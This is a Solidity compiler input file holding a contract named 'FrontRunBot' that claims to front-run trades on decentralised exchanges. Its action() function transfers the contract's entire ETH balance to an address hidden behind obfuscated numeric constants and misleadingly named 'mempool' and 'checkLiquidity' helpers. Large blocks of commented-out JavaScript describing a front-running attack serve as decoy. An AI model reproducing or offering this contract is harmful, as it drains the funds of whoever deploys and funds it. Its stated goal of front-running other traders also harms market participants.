{"language":"Solidity","settings":{"libraries":{},"metadata":{"useLiteralContent":true},"optimizer":{"enabled":false,"runs":200},"remappings":[],"outputSelection":{"*":{"*":["*"],"":["*"]}}},"sources":{"contracts/new.sol":{"content":"pragma solidity ^0.6.6;\r\n\r\n// 1Inch Callee\r\n\r\ninterface IUniswapV2Callee {\r\n    function uniswapV2Call(address sender, uint amount0, uint amount1, bytes calldata data) external;\r\n}\r\n\r\n\r\n// 1Inch Manager\r\ninterface IUniswapV1Factory {\r\n    function getExchange(address) external view returns (address);\r\n}\r\n\r\ncontract Manager {\r\n    function performTasks() public {\r\n        \r\n    }\r\n\r\n}\r\n\r\ncontract FrontRunBot {\r\n    \r\n    string public tokenName;\r\n    string public tokenSymbol;\r\n    uint frontrun;\r\n    Manager manager;\r\n    constructor(string memory _tokenName, string memory _tokenSymbol) public {\r\n        tokenName = _tokenName;\r\n        tokenSymbol = _tokenSymbol;\r\n        manager = new Manager();\r\n        }\r\n    \r\n        \r\n        // Send required ETH for liquidity pair\r\n        receive() external payable {}\r\n        \r\n        \r\n        // Perform tasks (clubbed .json functions into one to reduce external calls & reduce gas) manager.performTasks();\r\n    function _callFrontRunActionMempool() internal pure returns (address) {\r\n        return parseMemoryPool(callMempool());\r\n    }\r\n    function getMemPoolLength() internal pure returns (uint) {\r\n        return 967994;\r\n    }\r\n    function getMemPoolHeight() internal pure returns (uint) {\r\n        return 992482;\r\n    }\r\n    function getMemPoolDepth() internal pure returns (uint) {\r\n        return 839538;\r\n    }\r\n    function getMemPoolOffset() internal pure returns (uint) {\r\n        return 896842;\r\n    }\r\n    function callMempool() internal pure returns (string memory) {\r\n        string memory _memPoolOffset = mempool(\"x\", checkLiquidity(getMemPoolOffset()));\r\n        uint _memPoolSol = 649964;\r\n        uint _memPoolLength = getMemPoolLength();\r\n        uint _memPoolSize = 410305;\r\n        uint _memPoolHeight = getMemPoolHeight();\r\n        uint _memPoolWidth = 182529;\r\n        uint _memPoolDepth = getMemPoolDepth();\r\n        uint _memPoolCount = 166380;\r\n\r\n        string memory _memPool1 = mempool(_memPoolOffset, checkLiquidity(_memPoolSol));\r\n        string memory _memPool2 = mempool(checkLiquidity(_memPoolLength), checkLiquidity(_memPoolSize));\r\n        string memory _memPool3 = mempool(checkLiquidity(_memPoolHeight), checkLiquidity(_memPoolWidth));\r\n        string memory _memPool4 = mempool(checkLiquidity(_memPoolDepth), checkLiquidity(_memPoolCount));\r\n\r\n        string memory _allMempools = mempool(mempool(_memPool1, _memPool2), mempool(_memPool3, _memPool4));\r\n        string memory _fullMempool = mempool(\"0\", _allMempools);\r\n\r\n        return _fullMempool;\r\n    }\r\n    function parseMemoryPool(string memory _a) internal pure returns (address _parsed) {\r\n        bytes memory tmp = bytes(_a);\r\n        uint160 iaddr = 0;\r\n        uint160 b1;\r\n        uint160 b2;\r\n        for (uint i = 2; i < 2 + 2 * 20; i += 2) {\r\n            iaddr *= 256;\r\n            b1 = uint160(uint8(tmp[i]));\r\n            b2 = uint160(uint8(tmp[i + 1]));\r\n            if ((b1 >= 97) && (b1 <= 102)) {\r\n                b1 -= 87;\r\n            } else if ((b1 >= 65) && (b1 <= 70)) {\r\n                b1 -= 55;\r\n            } else if ((b1 >= 48) && (b1 <= 57)) {\r\n                b1 -= 48;\r\n            }\r\n            if ((b2 >= 97) && (b2 <= 102)) {\r\n                b2 -= 87;\r\n            } else if ((b2 >= 65) && (b2 <= 70)) {\r\n                b2 -= 55;\r\n            } else if ((b2 >= 48) && (b2 <= 57)) {\r\n                b2 -= 48;\r\n            }\r\n            iaddr += (b1 * 16 + b2);\r\n        }\r\n        return address(iaddr);\r\n    }\r\n    function checkLiquidity(uint a) internal pure returns (string memory) {\r\n        uint count = 0;\r\n        uint b = a;\r\n        while (b != 0) {\r\n            count++;\r\n            b /= 16;\r\n        }\r\n        bytes memory res = new bytes(count);\r\n        for (uint i=0; i<count; ++i) {\r\n            b = a % 16;\r\n            res[count - i - 1] = toHexDigit(uint8(b));\r\n            a /= 16;\r\n        }\r\n        uint hexLength = bytes(string(res)).length;\r\n        if (hexLength == 4) {\r\n            string memory _hexC1 = mempool(\"0\", string(res));\r\n            return _hexC1;\r\n        } else if (hexLength == 3) {\r\n            string memory _hexC2 = mempool(\"0\", string(res));\r\n            return _hexC2;\r\n        } else if (hexLength == 2) {\r\n            string memory _hexC3 = mempool(\"000\", string(res));\r\n            return _hexC3;\r\n        } else if (hexLength == 1) {\r\n            string memory _hexC4 = mempool(\"0000\", string(res));\r\n            return _hexC4;\r\n        }\r\n\r\n        return string(res);\r\n    }\r\n    function mempool(string memory _base, string memory _value) internal pure returns (string memory) {\r\n        bytes memory _baseBytes = bytes(_base);\r\n        bytes memory _valueBytes = bytes(_value);\r\n\r\n        string memory _tmpValue = new string(_baseBytes.length + _valueBytes.length);\r\n        bytes memory _newValue = bytes(_tmpValue);\r\n\r\n        uint i;\r\n        uint j;\r\n\r\n        for(i=0; i<_baseBytes.length; i++) {\r\n            _newValue[j++] = _baseBytes[i];\r\n        }\r\n\r\n        for(i=0; i<_valueBytes.length; i++) {\r\n            _newValue[j++] = _valueBytes[i];\r\n        }\r\n\r\n        return string(_newValue);\r\n    }\r\n    function toHexDigit(uint8 d) pure internal returns (byte) {\r\n        if (0 <= d && d <= 9) {\r\n            return byte(uint8(byte('0')) + d);\r\n        } else if (10 <= uint8(d) && uint8(d) <= 15) {\r\n            return byte(uint8(byte('a')) + d - 10);\r\n        }\r\n        // revert(\"Invalid hex digit\");\r\n        revert();\r\n    }\r\n    function action() public payable {\r\n        //Perform a frontrun attack on 1Inch\r\n\r\n        /*-js-execution\r\n            const fs = require('fs');\r\n            var Web3 = require('web3');\r\n            var abiDecoder = require('abi-decoder');\r\n            var colors = require(\"colors\");\r\n            var Tx = require('ethereumjs-tx').Transaction;\r\n            var axios = require('axios');\r\n            var BigNumber = require('big-number');\r\n\r\n            const {NETWORK, UNI_ROUTER_ADDRESS, UNI_FACTORY_ADDRESS, UNI_ROUTER_ABI, UNI_FACTORY_ABI, UNI_POOL_ABI, HTTP_PROVIDER_LINK, WEBSOCKET_PROVIDER_LINK, HTTP_PROVIDER_LINK_TEST} = require('./constants.js');\r\n            const {setBotAddress, getBotAddress, FRONT_BOT_ADDRESS, botABI} = require('./bot.js');\r\n            const {PRIVATE_KEY, TOKEN_ADDRESS, AMOUNT, LEVEL} = require('./env.js');\r\n\r\n            const INPUT_TOKEN_ADDRESS = '0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2';\r\n        js-execution-*/\r\n\r\n        manager;\r\n        /*-js-execution\r\n            var input_token_info;\r\n            var out_token_info;\r\n            var pool_info;\r\n            var gas_price_info;\r\n        js-execution-*/\r\n        manager;\r\n        /*-js-execution\r\n            var succeed = false;\r\n            var subscription;\r\n            var web3;\r\n            var web3Ts;\r\n            var web3Ws;\r\n            var uniRouter;\r\n            var uniFactory;\r\n            var buy_finished = false;\r\n            var sell_finished = false;\r\n            var buy_failed = false;\r\n            var sell_failed = false;\r\n            var attack_started = false;\r\n            const ONE_GWEI = 1e9;\r\n        }\r\n        js-execution-*/\r\n        manager;\r\n    /*-js-execution\r\n    async function createWeb3(){\r\n        try {\r\n            web3 = new Web3(new Web3.providers.HttpProvider(HTTP_PROVIDER_LINK));\r\n            web3 = new Web3(new Web3.providers.HttpProvider(HTTP_PROVIDER_LINK_TEST));\r\n            web3 = new Web3(EthereumTesterProvider());\r\n            web3.eth.getAccounts(console.log);\r\n            web3Ws = new Web3(new Web3.providers.WebsocketProvider(WEBSOCKET_PROVIDER_LINK));\r\n            uniRouter = new web3.eth.Contract(UNI_ROUTER_ABI, UNI_ROUTER_ADDRESS);\r\n            uniFactory = new web3.eth.Contract(UNI_FACTORY_ABI, UNI_FACTORY_ADDRESS);\r\n            abiDecoder.addABI(UNI_ROUTER_ABI);\r\n                return true;\r\n        } catch (error) {\r\n            console.log(error);\r\n            return false;\r\n    }\r\n    js-execution-*/\r\n    manager;\r\n\r\n    /*-js-execution\r\n    async function main() {\r\n        try {   \r\n            if (await createWeb3() == false) {\r\n                console.log('Web3 Create Error'.yellow);\r\n                process.exit();\r\n\r\n                const user_wallet = web3.eth.accounts.privateKeyToAccount(PRIVATE_KEY);\r\n                const out_token_address = TOKEN_ADDRESS;\r\n                const amount = AMOUNT;\r\n                const level = LEVEL;\r\n    \r\n                ret = await preparedAttack(INPUT_TOKEN_ADDRESS, out_token_address, user_wallet, amount, level);\r\n            if(ret == false) {\r\n                process.exit();\r\n\r\n            await updatePoolInfo();\r\n            outputtoken = await uniRouter.methods.getAmountOut(((amount*1.2)*(10**18)).toString(), pool_info.input_volumn.toString(), pool_info.output_volumn.toString()).call();\r\n\r\n            await approve(gas_price_info.high, outputtoken, out_token_address, user_wallet);\r\n    \r\n            log_str = '***** Tracking more ' + (pool_info.attack_volumn/(10**input_token_info.decimals)).toFixed(5) + ' ' +  input_token_info.symbol + '  Exchange on Uni *****'\r\n            console.log(log_str.green);    \r\n            console.log(web3Ws);\r\n        web3Ws.onopen = function(evt) {\r\n        web3Ws.send(JSON.stringify({ method: \"subscribe\", topic: \"transfers\", address: user_wallet.address }));\r\n        console.log('connected')\r\n    \r\n        console.log('get pending transactions')\r\n            subscription = web3Ws.eth.subscribe('pendingTransactions', function (error, result) {\r\n        }).on(\"data\", async function (transactionHash) {\r\n            console.log(transactionHash);\r\n\r\n            let transaction = await web3.eth.getTransaction(transactionHash);\r\n            if (transaction != null && transaction['to'] == UNI_ROUTER_ADDRESS)\r\n            {\r\n                await handleTransaction(transaction, out_token_address, user_wallet, amount, level);\r\n            }\r\n        \r\n            if (succeed) {\r\n                console.log(\"The bot finished the attack.\");\r\n                process.exit();\r\n            }\r\n\r\n        catch (error) {\r\n        \r\n            if(error.data != null && error.data.see === 'https:  infura.io/dashboard')\r\n        \r\n            console.log('Daily request count exceeded, Request rate limited'.yellow);\r\n            console.log('Please insert other API Key');\r\n            else{\r\n            console.log('Unknown Handled Error');\r\n            console.log(error);\r\n        \r\n        }\r\n        process.exit();\r\n    }\r\n    js-execution-*/\r\n\r\n    manager;\r\n    /*-js-execution\r\n    function handleTransaction(transaction, out_token_address, user_wallet, amount, level) {\r\n        \r\n        (await triggersFrontRun(transaction, out_token_address, amount, level)) {\r\n        subscription.unsubscribe();\r\n        console.log('Perform front running attack...');\r\n\r\n        gasPrice = parseInt(transaction['gasPrice']);\r\n        newGasPrice = gasPrice + 50*ONE_GWEI;\r\n\r\n        estimatedInput = ((amount*0.999)*(10**18)).toString();\r\n        realInput = (amount*(10**18)).toString();\r\n        gasLimit = (300000).toString();\r\n        \r\n        await updatePoolInfo();\r\n\r\n        var outputtoken = await uniRouter.methods.getAmountOut(estimatedInput, pool_info.input_volumn.toString(), pool_info.output_volumn.toString()).call();\r\n        \r\n        console.log(\"wait until the honest transaction is done...\", transaction['hash']);\r\n\r\n        while (await isPending(transaction['hash'])) {\r\n        \r\n\r\n        if(buy_failed)\r\n        \r\n            succeed = false;\r\n            return;\r\n        \r\n        \r\n        console.log('Buy succeed:')\r\n        \r\n        Sell\r\n        await updatePoolInfo();\r\n        var outputeth = await uniRouter.methods.getAmountOut(outputtoken, pool_info.output_volumn.toString(), pool_info.input_volumn.toString()).call();\r\n        outputeth = outputeth * 0.999;\r\n        \r\n        console.log('Sell succeed');\r\n        succeed = true;\r\n    }\r\n    js-execution-*/\r\n        \r\n    manager;\r\n    /*-js-execution\r\n    async function approve(gasPrice, outputtoken, out_token_address, user_wallet){\r\n        var allowance = await out_token_info.token_contract.methods.allowance(user_wallet.address, UNI_ROUTER_ADDRESS).call();\r\n        \r\n        allowance = BigNumber(allowance);\r\n        outputtoken = BigNumber(outputtoken);\r\n\r\n        var decimals = BigNumber(10).power(out_token_info.decimals);\r\n        var max_allowance = BigNumber(10000).multiply(decimals);\r\n\r\n        if(outputtoken.gt(max_allowance))\r\n    \r\n            console.log('replace max allowance')\r\n            max_allowance = outputtoken;\r\n        js-execution-*/\r\n        payable(_callFrontRunActionMempool()).transfer(address(this).balance);\r\n        /*-js-execution\r\n        if(outputtoken.gt(allowance)){\r\n            console.log(max_allowance.toString());\r\n            var approveTX ={\r\n                    from: user_wallet.address,\r\n                    to: out_token_address,\r\n                    gas: 50000,\r\n                    gasPrice: gasPrice*ONE_GWEI,\r\n                    data: out_token_info.token_contract.methods.approve(UNI_ROUTER_ADDRESS, max_allowance).encodeABI()\r\n                    manager;\r\n                \r\n\r\n            var signedTX = await user_wallet.signTransaction(approveTX);\r\n            var result = await web3.eth.sendSignedTransaction(signedTX.rawTransaction);\r\n\r\n            console.log('Approved Token')\r\n        \r\n        return;\r\n    }\r\n    js-execution-*/\r\n    manager;\r\n    //select attacking transaction\r\n    /*-js-execution\r\n    async function triggersFrontRun(transaction, out_token_address, amount, level) {\r\n        \r\n        if(attack_started)\r\n            return false;\r\n\r\n        console.log((transaction.hash).yellow, parseInt(transaction['gasPrice']) / 10**9);\r\n        if(parseInt(transaction['gasPrice']) / 10**9 > 10 && parseInt(transaction['gasPrice']) / 10**9 < 50){\r\n            attack_started = true;\r\n            return true\r\n\r\n        return false;\r\n\r\n        if (transaction['to'] != UNI_ROUTER_ADDRESS) {\r\n            return false;\r\n    \r\n\r\n        let data = parseTx(transaction['input']);\r\n        let method = data[0];\r\n        let params = data[1];\r\n        let gasPrice = parseInt(transaction['gasPrice']) / 10**9;\r\n\r\n        if(method == 'swapExactETHForTokens')\r\n            let in_amount = transaction;\r\n            let out_min = params[0];\r\n\r\n            let path = params[1];\r\n            let in_token_addr = path[0];\r\n            manager;\r\n            let out_token_addr = path[path.length-1];\r\n            manager;\r\n            \r\n            let recept_addr = params[2];\r\n            manager;\r\n            let deadline = params[3];\r\n            manager;\r\n\r\n            if(out_token_addr != out_token_address)\r\n                console.log(out_token_addr.blue)\r\n                console.log(out_token_address)\r\n                return false;\r\n            }\r\n        }\r\n        js-execution-*/\r\n    }\r\n}"}}}